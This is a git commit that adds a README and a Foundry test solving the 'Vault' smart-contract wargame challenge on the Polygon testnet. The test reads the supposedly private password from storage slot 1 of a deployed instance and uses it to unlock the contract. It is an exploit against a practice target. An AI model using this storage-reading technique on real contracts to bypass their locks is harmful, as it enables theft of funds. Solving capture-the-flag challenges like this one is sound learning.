4c634a115ec795c35f06870ba466245bbd9f6ce9
Maurizio Murru <maurizio.murru93@gmail.com>
2023-05-28 14:41:09 +0200

    Vault challenge completed.

---
+++ Vault/README.md
@@ -0,0 +1,11 @@
+# Vault
+
+Please set the private key in the `.env` file and you instance address in the files `script/Vault.s.sol` and `test/Vault.t.sol`
+
+## Runing tests
+
+`forge test -f https://polygon-testnet.public.blastapi.io`
+
+## Running scripts
+
+forge script script/Vault.s.sol -f https://polygon-testnet.public.blastapi.io --broadcast
---
+++ Vault/test/Vault.t.sol
@@ -0,0 +1,20 @@
+// SPDX-License-Identifier: UNLICENSED
+pragma solidity ^0.8.13;
+
+import "forge-std/Test.sol";
+import "../src/Vault.sol";
+
+contract ForceTest is Test {
+    
+    address instance = 0x919119E8eB67056D58E78A64b09f688853F8E326;
+
+    function test() external {
+        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
+        // read the storage slot that contains the private variable `password`, since it is in the second slot, we use uint256(1) to access it
+        bytes32 password = vm.load(instance, bytes32(uint256(1)));
+        console.logBytes32(password);
+        Vault(instance).unlock(password);
+        console.logBool(Vault(instance).locked());
+        vm.stopBroadcast();
+    }
+}
